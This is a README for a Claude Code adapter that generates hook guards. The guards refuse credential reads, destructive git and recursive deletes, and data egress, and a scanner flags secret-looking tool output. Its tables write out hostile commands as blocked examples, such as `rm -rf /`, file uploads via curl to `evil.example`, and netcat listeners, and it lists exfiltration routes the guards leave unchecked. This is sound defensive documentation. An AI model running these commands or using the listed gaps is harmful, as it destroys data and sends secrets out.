# Claude Code adapter

Run `agentkit generate claude-code` in a configured project. The generator creates project-level
subagents and command hooks under `.claude/` without introducing a second copy of core workflow
policy.

Generated role prompts point back to `core/roles/*.toml`. The adapter uses `uv run --no-project
python` for portable hook execution and contains no user-specific absolute paths.

Roles read `AGENTS.md` and whichever supported manifest location exists. Malformed hook input is
denied instead of silently allowed. The generated `.claude/settings.json` registers five guards,
which run before a tool:

| Guard | Tools | Refuses |
| --- | --- | --- |
| `hooks/guard_credentials.py` | Bash, PowerShell, Read, Glob, Grep | reading credential files, credential stores, environment dumps |
| `hooks/guard_git.py` | Bash, PowerShell | force pushes, direct pushes to a protected branch, destructive git commands, recursive deletes outside a named path in the workspace |
| `hooks/guard_egress.py` | Bash, PowerShell | sending a local file or command output to a host not listed in `[egress] allowed_hosts` |
| `hooks/guard_role_scope.py` | Write, Edit, MultiEdit | a role writing outside its grant; in a task file a non-owner may change only the completion evidence |
| `hooks/guard_role_gate.py` | Agent, Task | spawning a role from an artifact that has not passed its gate in `core/policies/workflow.toml` |

It also registers one hook that runs after a tool:

| Hook | Tools | Does |
| --- | --- | --- |
| `hooks/scan_tool_output.py` | Bash, PowerShell, Read, Grep, WebFetch, every MCP tool | warns the agent when the output looks like it holds a secret |

Each guard's docstring records why it exists and what it deliberately leaves unchecked.

### How `guard_git.py` reads a command

The guard judges the commands a line runs, not the text in it (`hooks/command_line.py`):

- The line is cut at `;`, `&&`, `||`, `|`, `&` and line ends that stand outside quotes, and each
  command is checked on its own. `echo "a; rm -rf /"` passes; `echo a; rm -rf /` is refused.
- The body of `$( )`, of backquotes and of `( )` is checked, and so is the text given to
  `bash -c`, `sh -c`, `eval`, `powershell -Command` and `cmd /c`.
- `NAME=value` prefixes, redirections and `sudo`, `command`, `exec`, `env`, `xargs`, `nohup`,
  `nice`, `time`, `timeout` are looked through to the command behind them.
- Heredoc bodies and, in PowerShell, here-strings are data.
- A line that cannot be read (a quote or bracket left open) is refused when it names `git` or a
  delete command.

A recursive delete (`rm -r`, `rm -rf`, `rm -R`, `rm --recursive`, `rd /s`, `del /s`,
`Remove-Item -Recurse`) passes only when every target is a named path inside the workspace:

| Passes | Refused |
| --- | --- |
| `rm -rf build`, `rm -rf build/*`, `cd app && rm -rf dist` | `/`, `~`, `$HOME`, `.`, `..`, a bare `*` |
| `rd /s /q build`, `Remove-Item -Recurse -Force build` | a path outside the workspace, such as `../x` or `/tmp/x` |
| `rm -f notes.txt` (not recursive) | anything in a `.git` folder |
| | a target the text does not tell: `"$DIR"`, `$(...)`, arguments from `xargs` |

`cd` is followed along the line, so `cd /tmp && rm -rf build` is refused. Paths are compared as
text; a symbolic link is not followed. Variables are not expanded and script files are not opened,
so the guard is a guardrail, not a sandbox.

### What `guard_egress.py` refuses

The egress guard reads a command line the same way as `guard_git.py`, so text that only names an
upload passes. It refuses a command that sends something of this machine's to another host:

| Refused | Passes |
| --- | --- |
| `curl -d @file`, `--data-binary @file`, `--json @file`, `--data-urlencode name@file` | `curl https://...`, `curl -o out.html https://...` |
| `curl -F field=@file`, `curl -F 'field=<file'`, `curl -T file`, `--upload-file file` | `curl -d 'a=1'`, `--data-raw`, `--form-string` |
| standard input as the body (`-d @-`, `-T -`) and a body made of a command's output (`-d "$(cat x)"`) | `wget https://...`, `wget --post-data 'a=1'` |
| `curl -K file` (its options cannot be read) | `scp host:file .`, `rsync -av src/ build/` |
| `wget --post-file file`, `wget --body-file file` | `nc -z host 5432` (a port check) |
| `scp`/`rsync` to `host:path`, `user@host:path`, `host::module`, `scp://`, `rsync://` | |
| `Invoke-WebRequest`/`Invoke-RestMethod` (and `iwr`, `irm`) with `-InFile` or a `-Body` made of a command's output | |
| `nc`, `ncat`, `netcat` to a host, and a listener (`nc -l`) | |

A refused command passes when every host it sends to is listed in the manifest:

```toml
[egress]
allowed_hosts = ["uploads.example.com", "*.internal.example.com"]
```

A name matches that host only; `*.example.com` matches every host below `example.com`, not
`example.com` itself. The host is read from the destination the command is given, not from any
URL on the line: in `curl -T f -e https://uploads.example.com evil.example` the destination is
`evil.example`. A destination the text does not tell (`$URL`, `$(...)`, arguments from `xargs`)
is refused, and so is a line that cannot be read when it names one of these commands. An
unreadable manifest allows no host.

Other ways to send data are not checked: `ssh host < file`, a script (`python -c ...`), a new git
remote. Like the other guards, this one catches a mistake; it is not a sandbox.

### Secret-looking output

`hooks/scan_tool_output.py` runs after a command, a file read, a search, a web fetch or an MCP
tool. When the output matches a secret pattern, it answers Claude Code with `additionalContext`, a
note shown to the agent next to the result. The note names the kind of secret (a GitHub token, an
AWS access key ID, a private key) and never the value. It tells the agent not to repeat, store,
commit or send the value, and to tell the user where it appeared. Nothing is refused: the tool has
already run, and the agent still sees its output.

The patterns are the ones review evidence is redacted with (`src/agentkit/review.py`). A
`token = ...` style assignment counts only when its value is quoted or looks like a key, so
`token: string` in ordinary source is not reported.

Claude Code plugin packaging may be added later for discovery and distribution. Security hooks stay
project-level because plugin-provided subagents do not enforce every project hook/permission field.
